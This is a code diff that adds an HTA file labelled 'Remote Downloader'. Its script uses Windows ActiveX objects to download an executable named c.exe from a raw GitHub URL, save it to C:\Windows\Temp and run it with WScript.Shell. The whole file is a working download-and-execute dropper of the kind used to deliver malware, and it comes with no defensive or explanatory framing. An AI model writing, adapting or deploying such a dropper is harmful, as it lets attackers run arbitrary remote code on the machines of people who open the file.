@@ -1,0 +1,49 @@
+<HTML>
+<HEAD>
+<TITLE>Remote Downloader</TITLE>
+<HTA:APPLICATION ID="RemoteDownloader">
+</HEAD>
+<BODY>
+<H3>Remote File Downloader</H3>
+<button onclick="downloadAndRun()">Download and Run EXE</button>
+<div id="status">Ready to download from GitHub</div>
+
+<SCRIPT>
+function downloadAndRun() {
+    try {
+        document.getElementById('status').innerHTML = "Starting download...";
+        
+        // URL to your EXE on GitHub (use raw URL)
+        var exeURL = "https://raw.githubusercontent.com/cernipoko-bit/sadlife/main/c.exe";
+        var localExePath = "C:\\Windows\\Temp\\downloaded_app.exe";
+        
+        // Download the EXE
+        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+        xhr.open("GET", exeURL, false);
+        xhr.send();
+        
+        if (xhr.status === 200) {
+            // Save EXE to temp location
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Open();
+            stream.Type = 1; // Binary
+            stream.Write(xhr.responseBody);
+            stream.SaveToFile(localExePath, 2);
+            stream.Close();
+            
+            document.getElementById('status').innerHTML = "Download complete! Running executable...";
+            
+            // Execute the downloaded EXE
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run(localExePath);
+            
+        } else {
+            document.getElementById('status').innerHTML = "Download failed. Status: " + xhr.status;
+        }
+    } catch(e) {
+        document.getElementById('status').innerHTML = "Error: " + e.message;
+    }
+}
+</SCRIPT>
+</BODY>
+</HTML>
